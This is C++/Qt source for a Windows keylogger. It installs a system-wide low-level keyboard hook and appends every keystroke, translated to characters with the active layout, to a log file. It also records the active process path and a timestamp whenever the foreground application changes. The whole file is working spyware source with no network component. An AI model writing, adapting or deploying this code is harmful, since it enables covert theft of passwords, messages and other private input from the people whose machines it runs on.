#include "klog.h"

Klog &Klog::instance()
{
    static Klog _instance;
    return _instance;
}

void Klog::setParameters(const bool &work, const int &seconds)
{
    isWorking = work;
    if (seconds == 0)
        timer->stop();
    else
        timer->start(seconds*1000);
}

void Klog::setPath(const QString &newPath)
{
    path = newPath;
    logFile->setFileName(path + "/data.log");
}

Klog::Klog(QObject *parent) :
    QObject(parent),
    timer(std::make_unique<QTimer>(this)),
    logFile(std::make_unique<QFile>(this)),
    isWorking(true),
    currProcess(),
    path()
{
    connect(timer.get(), &QTimer::timeout, this, &Klog::timerIsUp);

    HINSTANCE hInstance = GetModuleHandle(NULL);

    //Register hook
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
                                          keyboardHookProc,
                                          hInstance,
                                          0);

    if (keyboardHook == NULL)
        qDebug() << "Keyboard hook installation error.";
}

LRESULT CALLBACK Klog::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    auto& klog = Klog::instance();
    //If Keylogger is ON && key is pressed
    if (klog.isWorking && wParam == WM_KEYDOWN)
    {
        //Open log file
        if ( ! klog.logFile->open(QIODevice::Append | QIODevice::Text))
        {
            qDebug () << "Cannot open log file";
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }

        QTextStream log(klog.logFile.get());

        //Get process ID and thread ID
        DWORD processId;
        GUITHREADINFO gti;
        ZeroMemory(&gti, sizeof(GUITHREADINFO));
        gti.cbSize = sizeof(GUITHREADINFO);
        GetGUIThreadInfo(0, &gti);
        DWORD threadId = GetWindowThreadProcessId(gti.hwndActive, &processId);

        //Get process handle
        HANDLE handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
        TCHAR procPath[MAX_PATH];

        //Get process path
        QString currProc;
        if (GetModuleFileNameEx(handle, 0, procPath, MAX_PATH))
        {
            currProc = QString::fromWCharArray(procPath);
        }
        //Second variant (64-bit)
        else if (GetProcessImageFileName(handle, procPath, MAX_PATH))
        {
            //Get path in device form
            QString devicePath(QString::fromWCharArray(procPath));

            //Transform device form path to drive letters
            TCHAR driveLetter = 'A';
            TCHAR szTarget[512] = {0};
            while(driveLetter <= 'Z')
            {
                TCHAR szDeviceName[3] = {driveLetter, ':', '\0'};
                //Get drive letters of device names
                if(QueryDosDevice(szDeviceName, szTarget, 511) != 0)
                {
                    if(wcsncmp(procPath, szTarget, wcslen(szTarget)) == 0)
                        break;
                }
                ++driveLetter;
            }

            //Replace device name with drive letter
            devicePath.replace(0, wcslen(szTarget), (QChar)driveLetter + ':');
            currProc = devicePath;
        }

        //If process name has changed
        QString& prevProc = klog.currProcess;
        if (currProc != prevProc)
        {
            //Write process name and time to log
            log << "\n\n" << currProc << "\t" << QDateTime::currentDateTime().toString("hh:mm:ss dd.MM.yyyy") << "\n";
            klog.currProcess = currProc;
        }

        CloseHandle(handle);

        //KBDLLHOOKSTRUCT  contains information about a low-level keyboard input event:
        //vkCode, scanCode, flags, time, dwExtraInfo
        KBDLLHOOKSTRUCT*  kbdHook = (KBDLLHOOKSTRUCT*) (lParam);

        //Print keys
        switch (kbdHook->vkCode) {
            case VK_DELETE:
                log << "<DEL>";
                break;
            case VK_BACK:
                log << "<BACK>";
                break;
            case VK_RETURN:
                log << "\n";
                break;
            case VK_LCONTROL:
                [[fallthrough]];
            case VK_RCONTROL:
                log << "<CTRL>";
                break;

            case VK_CAPITAL:
            case VK_LSHIFT:
            case VK_RSHIFT:
            case VK_INSERT:
            case VK_END:
            case VK_PRINT:
            //Arrows
            case VK_LEFT:
            case VK_RIGHT:
            case VK_UP:
            case VK_DOWN:
                break;

            //Visible keys
            default:

            //Check Shift and CapsLock state
            bool isDownShift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            bool isDownCapslock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            bool isDownCtrl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;

            BYTE kbdState[256];
            wchar_t buff[4];

            GetKeyboardState(kbdState);
            if (isDownShift) kbdState[16] = 0x80;
            if (isDownCapslock) kbdState[20] = 0x01;
            if (isDownCtrl) kbdState[17] = 0x00;

            //Get keyboard layout for current thread
            HKL kbdLayout = GetKeyboardLayout(threadId);
            //Translate virtual-key code to the corresponding Unicode character
            ToUnicodeEx(kbdHook->vkCode, kbdHook->scanCode, kbdState, buff, _countof(buff), 0, kbdLayout);

            //Write to log
            log << QString::fromWCharArray(buff);
        }
        klog.logFile->close();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
